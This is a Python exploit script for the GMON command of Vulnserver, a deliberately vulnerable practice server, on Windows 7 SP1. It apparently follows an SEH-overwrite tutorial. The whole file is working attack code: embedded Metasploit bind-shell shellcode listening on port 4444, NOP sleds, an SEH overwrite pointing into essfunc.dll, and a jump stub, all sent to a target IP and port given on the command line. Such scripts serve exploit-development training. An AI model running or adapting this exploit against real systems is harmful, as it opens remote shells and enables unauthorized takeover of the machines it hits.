#!/usr/bin/env python

# reference http://resources.infosecinstitute.com/seh-exploit/
# Windows 7 x86, SP1
# invoke it with gmon-exploit-vulnserver.py TARGET-IP TARGET-PORT

import socket, sys

# shellcode msfpayload windows/shell_bind_tcp LPORT=4444 R | msfencode -b '\x00\x0a\x0d' -t c
shellcode=("\xdd\xc4\xd9\x74\x24\xf4\xba\xd1\xce\x11\xeb\x5d\x29\xc9"
"\xb1\x56\x31\x55\x18\x83\xed\xfc\x03\x55\xc5\x2c\xe4\x17"
"\x0d\x39\x07\xe8\xcd\x5a\x81\x0d\xfc\x48\xf5\x46\xac\x5c"
"\x7d\x0a\x5c\x16\xd3\xbf\xd7\x5a\xfc\xb0\x50\xd0\xda\xff"
"\x61\xd4\xe2\xac\xa1\x76\x9f\xae\xf5\x58\x9e\x60\x08\x98"
"\xe7\x9d\xe2\xc8\xb0\xea\x50\xfd\xb5\xaf\x68\xfc\x19\xa4"
"\xd0\x86\x1c\x7b\xa4\x3c\x1e\xac\x14\x4a\x68\x54\x1f\x14"
"\x49\x65\xcc\x46\xb5\x2c\x79\xbc\x4d\xaf\xab\x8c\xae\x81"
"\x93\x43\x91\x2d\x1e\x9d\xd5\x8a\xc0\xe8\x2d\xe9\x7d\xeb"
"\xf5\x93\x59\x7e\xe8\x34\x2a\xd8\xc8\xc5\xff\xbf\x9b\xca"
"\xb4\xb4\xc4\xce\x4b\x18\x7f\xea\xc0\x9f\x50\x7a\x92\xbb"
"\x74\x26\x41\xa5\x2d\x82\x24\xda\x2e\x6a\x99\x7e\x24\x99"
"\xce\xf9\x67\xf6\x23\x34\x98\x06\x2b\x4f\xeb\x34\xf4\xfb"
"\x63\x75\x7d\x22\x73\x7a\x54\x92\xeb\x85\x56\xe3\x22\x42"
"\x02\xb3\x5c\x63\x2a\x58\x9d\x8c\xff\xcf\xcd\x22\xaf\xaf"
"\xbd\x82\x1f\x58\xd4\x0c\x40\x78\xd7\xc6\xf7\xbe\x19\x32"
"\x54\x29\x58\xc4\x4b\xf5\xd5\x22\x01\x15\xb0\xfd\xbd\xd7"
"\xe7\x35\x5a\x27\xc2\x69\xf3\xbf\x5a\x64\xc3\xc0\x5a\xa2"
"\x60\x6c\xf2\x25\xf2\x7e\xc7\x54\x05\xab\x6f\x1e\x3e\x3c"
"\xe5\x4e\x8d\xdc\xfa\x5a\x65\x7c\x68\x01\x75\x0b\x91\x9e"
"\x22\x5c\x67\xd7\xa6\x70\xde\x41\xd4\x88\x86\xaa\x5c\x57"
"\x7b\x34\x5d\x1a\xc7\x12\x4d\xe2\xc8\x1e\x39\xba\x9e\xc8"
"\x97\x7c\x49\xbb\x41\xd7\x26\x15\x05\xae\x04\xa6\x53\xaf"
"\x40\x50\xbb\x1e\x3d\x25\xc4\xaf\xa9\xa1\xbd\xcd\x49\x4d"
"\x14\x56\x79\x04\x34\xff\x12\xc1\xad\xbd\x7e\xf2\x18\x81"
"\x86\x71\xa8\x7a\x7d\x69\xd9\x7f\x39\x2d\x32\xf2\x52\xd8"
"\x34\xa1\x53\xc9")

pref = "GMON /"
buf = "\x90" * 2772 # NOP padding
buf += "\x90" * 16 # shellcode padding
buf += shellcode # 368 bytes
buf += "\x90" * 362 # pad the rest of the buffer with NOP till 
buf += "\xEB\x0F\x90\x90" # JMP 0F, NOP, NOP
buf += "\xB4\x10\x50\x62" # SEH overwrite, essfunc.dll, POP EBX, POP EBP, RET
buf += "\x59\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1\xE8\xF2\xFF\xFF\xFF"
buf += "\x90" * 460 # data after the SEH handler

print "Sending evil buffer of " + str(len(buf)) + " bytes to " + sys.argv[1] + ":" + sys.argv[2]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn = sock.connect((sys.argv[1], int(sys.argv[2])))
print sock.recv(1024)
sock.send(pref + buf)
